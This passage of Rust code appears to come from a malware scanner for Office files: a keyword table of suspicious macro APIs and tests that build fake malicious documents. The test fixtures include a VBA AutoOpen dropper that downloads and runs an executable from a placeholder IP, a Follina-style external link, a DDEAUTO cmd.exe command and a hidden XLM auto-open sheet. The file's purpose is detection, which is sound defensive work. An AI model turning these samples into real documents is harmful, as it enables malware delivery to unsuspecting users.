        "runs when a Word document opens",
    ),
    ("autoexec", "Workbook_Open", "runs when a workbook opens"),
    (
        "autoexec",
        "Workbook_Activate",
        "runs when a workbook is activated",
    ),
    ("autoexec", "AutoExec", "runs when Word starts"),
    ("autoexec", "AutoNew", "runs when a document is created"),
    (
        "autoexec",
        "Document_New",
        "runs when a document is created",
    ),
    ("autoexec", "AutoClose", "runs when a document closes"),
    ("autoexec", "Auto_Close", "runs when a workbook closes"),
    ("autoexec", "Document_Close", "runs when a document closes"),
    (
        "autoexec",
        "Workbook_BeforeClose",
        "runs when a workbook closes",
    ),
    ("autoexec", "_Layout", "ActiveX event that fires on open"),
    ("autoexec", "_Painted", "ActiveX event that fires on open"),
    ("autoexec", "_GotFocus", "ActiveX event that fires on open"),
    // Launches programs.
    ("execute", "Shell", "runs a program"),
    ("execute", "WScript.Shell", "Windows Script Host shell"),
    (
        "execute",
        "Shell.Application",
        "runs programs through Explorer",
    ),
    ("execute", "ShellExecute", "runs a program"),
    ("execute", "CreateProcess", "starts a process"),
    ("execute", "WinExec", "runs a program"),
    ("execute", "MacScript", "runs an AppleScript"),
    ("execute", "Win32_Process", "starts a process through WMI"),
    ("execute", "powershell", "PowerShell"),
    ("execute", "cmd.exe", "command prompt"),
    ("execute", "mshta", "runs an HTML application"),
    ("execute", "rundll32", "runs a DLL"),
    ("execute", "regsvr32", "registers or runs a DLL"),
    (
        "execute",
        "certutil",
        "often used to download or decode payloads",
    ),
    ("execute", "bitsadmin", "background downloader"),
    ("execute", "schtasks", "creates a scheduled task"),
    // Downloads.
    ("download", "URLDownloadToFile", "downloads a file"),
    ("download", "XMLHTTP", "HTTP requests"),
    ("download", "WinHttpRequest", "HTTP requests"),
    ("download", "InternetOpen", "WinINet HTTP"),
    (
        "download",
        "ADODB.Stream",
        "writes downloaded bytes to disk",
    ),
    ("download", "ResponseBody", "reads an HTTP response"),
    // Writes files.
    ("drop", "SaveToFile", "writes a file"),
    ("drop", "CreateTextFile", "writes a file"),
    ("drop", "Put #", "writes binary data to a file"),
    ("drop", "For Binary", "opens a file for binary writing"),
    // Memory APIs for running shellcode in-process.
    ("inject", "VirtualAlloc", "allocates executable memory"),
    ("inject", "RtlMoveMemory", "copies bytes into memory"),
    ("inject", "CreateThread", "starts a thread at an address"),
    (
        "inject",
        "WriteProcessMemory",
        "writes into another process",
    ),
    ("inject", "CallWindowProc", "calls an address as code"),
    (
        "inject",
        "EnumSystemCodePages",
        "callback trick to run shellcode",
    ),
    // Hiding what the code does.
    ("obfuscation", "StrReverse", "reverses strings to hide them"),
    (
        "obfuscation",
        "CallByName",
        "calls a method by a computed name",
    ),
    ("obfuscation", "Base64", "decodes Base64"),
    ("obfuscation", "bin.base64", "decodes Base64 via MSXML"),
];

lazy_static::lazy_static! {
    static ref KEYWORD_RES: Vec<(&'static str, &'static str, &'static str, Regex)> = MACRO_KEYWORDS
        .iter()
        .map(|(kind, kw, desc)| {
            let escaped = regex::escape(kw);
            // ActiveX suffixes match the end of a procedure name; the rest
            // are whole words.
            let pattern = if kw.starts_with('_') {
                format!(r"(?i)\w{escaped}\b")
            } else if kw.chars().all(|c| c.is_alphanumeric() || c == '_') {
                format!(r"(?i)\b{escaped}\b")
            } else {
                format!(r"(?i){escaped}")
            };
            (*kind, *kw, *desc, Regex::new(&pattern).unwrap())
        })
        .collect();
}

fn score_macros(report: &mut OfficeReport) {
    let sources = std::mem::take(&mut report.sources);
    let mut found: BTreeSet<Indicator> = BTreeSet::new();
    let mut iocs: BTreeSet<String> = BTreeSet::new();
    for source in &sources {
        // Attribute lines are VBA's own bookkeeping, not code.
        let code: String = source
            .lines()
            .filter(|l| !l.trim_start().starts_with("Attribute "))
            .collect::<Vec<_>>()
            .join("\n");
        for (kind, kw, desc, re) in KEYWORD_RES.iter() {
            if re.is_match(&code) {
                found.insert(Indicator {
                    kind,
                    keyword: kw.to_string(),
                    description: desc,
                });
            }
        }
        if CHR_RE.find_iter(&code).count() > 20 {
            found.insert(Indicator {
                kind: "obfuscation",
                keyword: "Chr()".to_string(),
                description: "builds strings character by character",
            });
        }
        for re in [&*URL_RE, &*IP_RE, &*EXE_RE] {
            for m in re.find_iter(&code).take(50) {
                iocs.insert(m.as_str().to_string());
            }
        }
    }
    report.indicators = found.into_iter().collect();
    report.iocs = iocs.into_iter().take(100).collect();
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;
    use std::io::Write;

    /// An MS-OVBA CompressedContainer holding `data` in uncompressed
    /// chunks, which the spec allows and real files use.
    fn container(data: &[u8]) -> Vec<u8> {
        let mut out = vec![0x01];
        for chunk in data.chunks(4096) {
            let mut padded = chunk.to_vec();
            padded.resize(4096, 0);
            // Size field is (chunk size - 3); bit 15 clear = uncompressed;
            // signature bits 12-14 = 0b011.
            let header: u16 = 0x3000 | (4096 + 2 - 3);
            out.extend_from_slice(&header.to_le_bytes());
            out.extend_from_slice(&padded);
        }
        out
    }

    fn record(id: u16, body: &[u8]) -> Vec<u8> {
        let mut r = id.to_le_bytes().to_vec();
        r.extend_from_slice(&(body.len() as u32).to_le_bytes());
        r.extend_from_slice(body);
        r
    }

    fn dir_stream(modules: &[&str]) -> Vec<u8> {
        let mut d = Vec::new();
        d.extend(record(0x0001, &1u32.to_le_bytes())); // SYSKIND
                                                       // PROJECTVERSION: size says 4, 6 bytes follow.
        d.extend_from_slice(&0x0009u16.to_le_bytes());
        d.extend_from_slice(&4u32.to_le_bytes());
        d.extend_from_slice(&[1, 0, 0, 0, 2, 0]);
        d.extend(record(0x000F, &(modules.len() as u16).to_le_bytes())); // PROJECTMODULES
        for m in modules {
            d.extend(record(0x0019, m.as_bytes()));
            d.extend(record(0x001A, m.as_bytes()));
            let unicode: Vec<u8> = m.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
            d.extend(record(0x0032, &unicode));
            d.extend(record(0x0031, &0u32.to_le_bytes()));
            d.extend(record(0x002B, &[]));
        }
        d.extend(record(0x0010, &[])); // dir terminator
        d
    }

    /// A vbaProject.bin-shaped OLE file with one module per (name, source).
    pub(crate) fn vba_project(storage: &str, modules: &[(&str, &str)]) -> Vec<u8> {
        let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
        cf.create_storage_all(format!("{storage}/VBA")).unwrap();
        let names: Vec<&str> = modules.iter().map(|(n, _)| *n).collect();
        let mut dir = cf.create_stream(format!("{storage}/VBA/dir")).unwrap();
        dir.write_all(&container(&dir_stream(&names))).unwrap();
        drop(dir);
        for (name, source) in modules {
            let mut s = cf.create_stream(format!("{storage}/VBA/{name}")).unwrap();
            s.write_all(&container(source.as_bytes())).unwrap();
        }
        cf.flush().unwrap();
        cf.into_inner().into_inner()
    }

    pub(crate) fn ooxml(parts: &[(&str, &[u8])]) -> Vec<u8> {
        let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
        let opts = zip::write::SimpleFileOptions::default();
        w.start_file("[Content_Types].xml", opts).unwrap();
        w.write_all(b"<Types/>").unwrap();
        for (name, data) in parts {
            w.start_file(*name, opts).unwrap();
            w.write_all(data).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    pub(crate) const DROPPER: &str = "Attribute VB_Name = \"ThisDocument\"\r\n\
        Sub AutoOpen()\r\n\
          Dim x: Set x = CreateObject(\"MSXML2.XMLHTTP\")\r\n\
          x.Open \"GET\", \"http://203.0.113.9/p.exe\", False\r\n\
          x.Send\r\n\
          Shell Environ(\"TEMP\") & \"\\p.exe\"\r\n\
        End Sub\r\n";

    const HARMLESS: &str = "Attribute VB_Name = \"Module1\"\r\n\
        Sub FormatReport()\r\n\
          Range(\"A1:D20\").Font.Bold = True\r\n\
          MsgBox \"Done\"\r\n\
        End Sub\r\n";

    #[test]
    fn decompresses_the_spec_example() {
        // [MS-OVBA] 3.2.3, "Example 3": a container mixing literals and
        // copy tokens.
        let compressed: Vec<u8> = vec![
            0x01, 0x2F, 0xB0, 0x00, 0x23, 0x61, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65, 0x82, 0x66,
            0x00, 0x70, 0x61, 0x67, 0x68, 0x69, 0x6A, 0x01, 0x38, 0x08, 0x61, 0x6B, 0x6C, 0x00,
            0x30, 0x6D, 0x6E, 0x6F, 0x70, 0x06, 0x71, 0x02, 0x70, 0x04, 0x10, 0x72, 0x73, 0x74,
            0x75, 0x76, 0x10, 0x77, 0x78, 0x79, 0x7A, 0x00, 0x3C,
        ];
        let out = decompress(&compressed).expect("valid container");
        assert_eq!(
            String::from_utf8(out).unwrap(),
            "#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa"
        );
    }

    #[test]
    fn decompress_rejects_garbage_and_bad_offsets() {
        assert!(decompress(b"not a container").is_none());
        // Compressed chunk whose first token points before the output.
        assert!(decompress(&[0x01, 0x03, 0xB0, 0x01, 0x00, 0x10]).is_none());
    }

    #[test]
    fn parses_module_records() {
        let mods = parse_dir(&dir_stream(&["ThisDocument", "Module1"]));
        assert_eq!(mods.len(), 2);
        assert_eq!(mods[0].name, "ThisDocument");
        assert_eq!(mods[1].stream, "Module1");
    }

    #[test]
    fn auto_open_downloader_in_a_doc_is_malicious() {
        let doc = vba_project("/Macros", &[("ThisDocument", DROPPER)]);
        assert_eq!(detect(&doc), Some(OfficeFormat::Ole));
        let report = inspect(&doc, OfficeFormat::Ole);
        assert_eq!(report.macros.len(), 1, "{:?}", report.errors);
        assert!(report.has("autoexec") && report.has("download") && report.has("execute"));
        assert!(report.iocs.iter().any(|i| i.contains("203.0.113.9")));

        let det = analyze(&doc).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious);
        assert_eq!(det.metadata[STRONG_SIGNAL_KEY], serde_json::json!(true));
    }

    #[test]
    fn harmless_macro_is_benign() {
        let doc = vba_project("", &[("Module1", HARMLESS)]);
        let det = analyze(&doc).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Benign, "{:?}", det.metadata);
        assert_eq!(det.metadata["macroModules"].as_array().unwrap().len(), 1);
    }

    #[test]
    fn vba_inside_docm_is_found() {
        let bin = vba_project("", &[("ThisDocument", DROPPER)]);
        let docm = ooxml(&[("word/vbaProject.bin", &bin)]);
        assert_eq!(detect(&docm), Some(OfficeFormat::Ooxml));
        let det = analyze(&docm).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious);
        let modules = det.metadata["macroModules"].as_array().unwrap();
        assert_eq!(modules[0]["project"], "word/vbaProject.bin:/VBA");
    }

    #[test]
    fn remote_template_and_follina_are_malicious() {
        let rels = br#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://203.0.113.9/t.dotm" TargetMode="External"/></Relationships>"#;
        let det = analyze(&ooxml(&[("word/_rels/settings.xml.rels", rels)])).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious);

        let follina = br#"<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" Target="mhtml:https://203.0.113.9/x.html!x-usc:https://203.0.113.9/x.html" TargetMode="External"/></Relationships>"#;
        let det = analyze(&ooxml(&[("word/_rels/document.xml.rels", follina)])).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious);
    }

    #[test]
    fn plain_hyperlinks_are_not_flagged() {
        let rels = br#"<Relationships><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>"#;
        let det = analyze(&ooxml(&[("word/_rels/document.xml.rels", rels)])).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Benign);
    }

    #[test]
    fn dde_command_is_malicious() {
        let doc = br#"<w:document><w:body><w:p><w:r><w:instrText>DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"</w:instrText></w:r></w:p></w:body></w:document>"#;
        let det = analyze(&ooxml(&[("word/document.xml", doc)])).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious);
    }

    #[test]
    fn hidden_xlm_sheet_with_auto_open_is_malicious() {
        let sheet = b"<xm:macrosheet><c><f>EXEC(\"calc\")</f></c></xm:macrosheet>";
        let wb = br#"<workbook><sheets><sheet name="M1" sheetId="2" state="veryHidden" r:id="rId2"/></sheets><definedNames><definedName name="_xlnm.Auto_Open">M1!$A$1</definedName></definedNames></workbook>"#;
        let det = analyze(&ooxml(&[
            ("xl/macrosheets/sheet1.xml", sheet),
            ("xl/workbook.xml", wb),
        ]))
        .unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Malicious, "{:?}", det.metadata);
    }

    #[test]
    fn biff_macro_sheet_and_auto_open() {
        let mut wb = Vec::new();
        // BOUNDSHEET8: very hidden (2), macro sheet (1), name "M".
        let mut bs = vec![0, 0, 0, 0, 2, 1, 1, 0];
        bs.push(b'M');
        wb.extend_from_slice(&0x0085u16.to_le_bytes());
        wb.extend_from_slice(&(bs.len() as u16).to_le_bytes());
        wb.extend_from_slice(&bs);
        // LBL: fBuiltin, cch 1, name char 0x01 at offset 15.
        let mut lbl = vec![0u8; 16];
        lbl[0] = 0x20;
        lbl[3] = 1;
        lbl[15] = 0x01;
        wb.extend_from_slice(&0x0018u16.to_le_bytes());
        wb.extend_from_slice(&(lbl.len() as u16).to_le_bytes());
        wb.extend_from_slice(&lbl);

        let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
        cf.create_stream("/Workbook")
            .unwrap()
            .write_all(&wb)
            .unwrap();
        cf.flush().unwrap();
        let xls = cf.into_inner().into_inner();

        let report = inspect(&xls, OfficeFormat::Ole);
        assert_eq!(report.xlm.macro_sheets, vec!["M"]);
        assert!(report.xlm.auto_open);
        assert_eq!(analyze(&xls).unwrap().verdict, ThreatVerdict::Malicious);
    }

    #[test]
    fn packaged_executable_is_suspicious() {
        let mut native = 40u32.to_le_bytes().to_vec();
        native.extend_from_slice(&[2, 0]);
        native.extend_from_slice(b"invoice.exe\0C:\\tmp\\invoice.exe\0");
        let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
        cf.create_stream("/\u{1}Ole10Native")
            .unwrap()
            .write_all(&native)
            .unwrap();
        cf.flush().unwrap();
        let obj = cf.into_inner().into_inner();
        let docx = ooxml(&[("word/embeddings/oleObject1.bin", &obj)]);
        let det = analyze(&docx).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Suspicious, "{:?}", det.metadata);
    }

    #[test]
    fn encrypted_document_does_not_vote() {
        let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
        cf.create_stream("/EncryptionInfo")
            .unwrap()
            .write_all(b"x")
            .unwrap();
        cf.create_stream("/EncryptedPackage")
            .unwrap()
            .write_all(b"x")
            .unwrap();
        cf.flush().unwrap();
        let det = analyze(&cf.into_inner().into_inner()).unwrap();
        assert_eq!(det.verdict, ThreatVerdict::Unknown);
        assert!(det.non_vote().is_some());
    }

    #[test]
    fn non_office_files_are_ignored() {
        assert!(analyze(b"MZ\x90\x00 just a program").is_none());
        let mut w = zip::ZipWriter::new(Cursor::new(Vec::new()));
        w.start_file("a.txt", zip::write::SimpleFileOptions::default())
            .unwrap();
        w.write_all(b"hi").unwrap();
        assert!(analyze(&w.finish().unwrap().into_inner()).is_none());
    }

    #[test]
    fn truncated_ole_does_not_panic() {
        let doc = vba_project("/Macros", &[("ThisDocument", DROPPER)]);
        for cut in [8, 512, 1024, doc.len() / 2] {
            let _ = analyze(&doc[..cut]);
        }
    }
}
